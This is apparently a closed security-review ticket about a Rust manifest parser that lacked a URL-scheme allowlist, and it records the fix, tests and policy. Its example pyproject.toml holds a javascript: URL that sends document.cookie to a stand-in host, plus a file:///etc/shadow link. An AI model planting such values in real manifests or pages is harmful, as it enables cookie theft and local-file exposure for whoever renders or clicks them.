---
id: TASK-1755
title: >-
  SEC-11: pick_url has no URL-scheme allowlist — javascript:/data:/file: reach
  the rendered homepage and repository fields
status: Done
assignee:
  - TASK-1992
created_date: '2026-08-27 11:17'
updated_date: '2026-08-28 20:04'
labels:
  - code-review-rust
  - security
dependencies: []
modified_files:
  - extensions-python/about/src/lib.rs
priority: high
---

## Description

<!-- SECTION:DESCRIPTION:BEGIN -->
**File**: `extensions-python/about/src/lib.rs:348` (`pick_url`), with the resulting values consumed at `extensions-python/about/src/lib.rs:284-296` (`extract_urls`) and surfaced via `ParsedManifest.homepage` / `.repository` (`lib.rs:99-100`).

**What**: `pick_url` accepts any `[project.urls]` value from `pyproject.toml` after only two checks — `trim_nonempty` and `contains_control_chars`. There is no allowlist of URL schemes. A checked-out repository whose `pyproject.toml` contains:

```toml
[project.urls]
Homepage = "javascript:fetch('https://evil.tld/?c='+document.cookie)"
Repository = "file:///etc/shadow"
```

flows unmodified into `ProjectIdentity.homepage` / `.repository`, which are rendered as About-card field values (`crates/core/src/project_identity/card.rs:105-107`) and emitted verbatim in the `ops about --json` payload.

**Why it matters**: OWASP A03 (Injection). The About card is rendered to a terminal (modern terminals auto-linkify `scheme:` values via OSC 8), to markdown, and to JSON consumed by downstream tooling. `javascript:` and `data:text/html;base64,...` become clickable XSS payloads in any HTML/markdown surface; `file:` becomes a local-file exfiltration link. The manifest is untrusted input — `ops about` is routinely run against third-party checkouts.

The crate already accepted the "manifest URLs are attacker-controlled" premise for control characters (SEC-2 / TASK-1207, `contains_control_chars` at `lib.rs:377`), so the scheme gap is an inconsistent half-measure on the same threat model.

**Cross-crate note**: the sibling `extensions-node/about/src/repo_url.rs::normalize_repo_url` has the identical gap, filed separately as TASK-1722. A shared scheme-allowlist helper in `ops_about::text_util` (next to `trim_nonempty`) would fix both; this task tracks the Python provider's side.
<!-- SECTION:DESCRIPTION:END -->

## Acceptance Criteria
<!-- AC:BEGIN -->
- [x] #1 pick_url rejects any [project.urls] value whose scheme is not on an explicit allowlist (at minimum https, http; git/ssh forms only if normalised to https first)
- [x] #2 A scheme-less relative value (e.g. "example.com/x") is either rejected or explicitly normalised — it must not fall through unvalidated
- [x] #3 Rejection drops the field to None (matching the SEC-2 / TASK-1207 drop-not-strip policy) rather than emitting a partial URL
- [x] #4 Tests cover javascript:, data:, file: and vbscript: for both the homepage and repository slots, asserting the field is None
- [x] #5 The allowlist policy is stated in a doc comment referencing the SEC-2 sibling policy
<!-- AC:END -->

## Implementation Notes

<!-- SECTION:NOTES:BEGIN -->
Added `ops_about::text_util::has_allowed_url_scheme` (next to `trim_nonempty`,
as the finding suggested) and applied it in `pick_url` after the existing
trim + control-char filters, so a rejected value drops the field to `None`.
Allowlist is `https://` / `http://`, ASCII-case-insensitive per RFC 3986 §3.1;
scheme-less values are rejected rather than guessed at. The Python provider
performs no git/ssh rewriting, so there is no normalise-to-https branch here.

Tests: `non_allowlisted_url_schemes_drop_the_homepage_and_repository` covers
javascript:, data:, file: and vbscript: for both the homepage and repository
slots; `scheme_less_homepage_is_rejected` covers the scheme-less case;
`has_allowed_url_scheme_*` in `extensions/about/src/text_util.rs` pin the
helper directly. Policy documented on the helper and at the `pick_url` call
site, both referencing the SEC-2 / TASK-1207 drop-not-strip sibling.

The node side (TASK-1722, already Done) now routes its own allowlist check
through the same helper, so the policy has one definition across stacks.
<!-- SECTION:NOTES:END -->
